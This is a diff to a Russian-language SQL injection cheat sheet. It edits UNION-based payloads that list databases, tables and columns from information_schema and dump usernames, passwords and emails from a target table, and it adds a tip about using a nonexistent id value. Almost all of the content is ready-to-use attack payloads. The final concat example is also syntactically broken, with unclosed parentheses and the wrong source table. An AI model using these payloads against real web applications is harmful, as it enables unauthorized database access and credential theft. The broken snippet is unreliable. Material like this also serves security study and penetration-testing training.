@@ -97,25 +97,33 @@ session_user() - сессионый пользователь
 * Выводим все базы данных:
 
 ```sql
-'union select group_concat(schema_name),NULL,NULL from information_schema.schemata
+1337'union select group_concat(schema_name),NULL,NULL from information_schema.schemata -- -
 ```
 
 * Выводим все таблицы из базы данных database1
 
 ```sql
-'union select group_concat(table_name),NULL,NULL from information_schema.tables where table_schema='database1'
+1337'union select group_concat(table_name),NULL,NULL from information_schema.tables where table_schema='database1' -- -
 ```
 
 * Выводим все колонки из таблицы `table1`, которая находится в базе данных `database1`:
 
 ```sql
-'union select group_concat(column_name),NULL,NULL from information_schema.columns where table_schema='database1' and table_name='table1'
+1337'union select group_concat(column_name),NULL,NULL from information_schema.columns where table_schema='database1' and table_name='table1' -- -
 ```
 
 * Выводим все данные `username`, `password`, `email` из таблицы `table1`, которая находится в базе данных `database1`:
 
 ```sql
-Injection=> select group_concat("\n", username,":",password,":",email,"\n"),NULL,NULL from database1.table1
+1337'union select group_concat("\n", username,":",password,":",email,"\n"),NULL,NULL from database1.table1
+```
+
+**1337 -** например, параметр id, но важно, чтобы такого значения не было в таблице (или можно использовать -1).
+
+Вместе с group\_concat() можно использовать concat(), чтобы выбрать еще поля. Например:
+
+```
+(...),group_concat(concat('\n', table_name, ':', column_name from information_schema.schemata -- -
 ```
 
 ## Обход фильтров
